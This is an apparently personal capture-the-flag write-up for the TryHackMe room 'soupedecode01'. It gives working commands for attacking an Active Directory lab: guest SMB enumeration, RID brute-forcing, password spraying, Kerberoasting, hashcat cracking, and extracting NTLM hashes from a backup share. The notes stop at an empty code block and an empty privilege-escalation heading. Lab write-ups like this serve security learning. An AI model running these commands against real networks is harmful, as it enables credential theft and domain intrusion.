# URL
https://tryhackme.com/room/soupedecode01
# Port scanning
There's all the typical Windows AD ports open, and some extra ones for the DC:
* 53, 88, 139, 445, and a bunch of stuff on the 40000 range
* the services we need to pay attention to are, Kerberos, SMB, LDAP
# Initial Access
* we scan the box with Netexec to find out if the guest account is enabled or not:
```
nxc smb <IP_ADDRESS> -u 'guest' -p ''
```
* we learn that the guest account is enabled, so we check for users, using the rid-brute method
```
nxc smb <IP_ADDRESS> -u 'guest' -p '' --rid-brute > userglob.txt
```
* we format that userglob file with the following command
```
cat userglob.txt | cut -d '\' -f 2 | cut -d '(' -f 1 | tr -d ' ' > users.txt
```
* After we have our users.txt file, we can password spray using the usernames as the passwords:
```
nxc smb <IP_ADDRESS> -u users.txt -p users.txt --continue-on-success --no-bruteforce | grep -v -i "guest" | grep -e "+"
```
* from the output, we are able to enumerate one valid domain user, `ybob317:ybob317`
* this is a domain user, so we can attempt Kerberoasting, which could give us the password hashes for service accounts:
```
nxc ldap <IP_ADDRESS> -u 'ybob317' -p 'ybob317' --kerberoasting output.txt
```
* We successfully Kerberoast and get serveral service account password hashes. We can crack them using Hashcat with this command
```
hashcat -m13100 output.txt /usr/share/wordlists/rockyou.txt
```
* we manage to capture the password for the `file_svc` account, which is `Password123!!`. We can enumerate this user's fileshares on SMB
```
nxc smb <IP_ADDRESS> -u 'file_svc' -p 'Password123!!' --shares
```
* we see that this user has access to the `backup` file share, so we can use Smbclient to login as that user and see what's in there
```
smbclient //<IP_ADDRESS>/backup -U 'file_svc'
```
* There's a file in the share with a bunch of service accounts and NTLM hashes
* We can use the following commands to create a user list and hashes list from that file:
```
cat backup_extract.txt | cut -d ":" -f 1 > service_users.txt
cat backup_extract.txt | cut -d ":" -f 4 > ntlm_hashes.txt
```
* after that, we can do a password spray with the service users and the ntlm hashes
```

```
# Privilege Escalation
